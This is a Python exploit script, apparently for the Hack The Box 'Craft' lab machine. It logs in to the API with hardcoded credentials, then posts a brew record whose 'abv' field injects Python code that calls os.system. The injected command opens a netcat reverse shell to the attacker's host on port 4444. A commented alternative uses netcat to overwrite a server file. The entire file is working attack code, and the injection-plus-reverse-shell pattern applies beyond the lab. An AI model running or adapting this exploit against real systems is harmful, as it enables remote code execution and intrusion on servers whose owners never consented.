#!/usr/bin/python3

PAYLOAD = 'nc 10.10.xx.xx 4444 -e /bin/sh'
#PAYLOAD = 'nc 10.10.xx.xx 4444 > database.py'

import requests
import json
from urllib3.exceptions import InsecureRequestWarning

# Ignore insecure https request warnings.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

base_url = 'https://api.craft.htb/api/'
creds = ('dinesh', '4aUh0A8PbVJxgd')

# Retrieve the authentication token.
r = requests.get(base_url+'auth/login', auth=creds, verify=False)

# Set our headers.
headers = {
    'X-Craft-API-Token': r.json()['token'],
    'Content-Type': 'application/json'
}

# Check whether token is valid.
r = requests.get(base_url+'auth/check', headers=headers, verify=False)
assert r.json()['message'] == 'Token is valid!'

# Craft payload.
payload = {
    'name': 'ghuul',
    'brewer': 'ghuul',
    'style': 'ghuul'
}
payload['abv'] = '__import__("os").system("%s") or 10' % PAYLOAD

# Make request with payload.
payload = json.dumps(payload)
requests.post(base_url+'brew/', headers=headers, data=payload, verify=False)
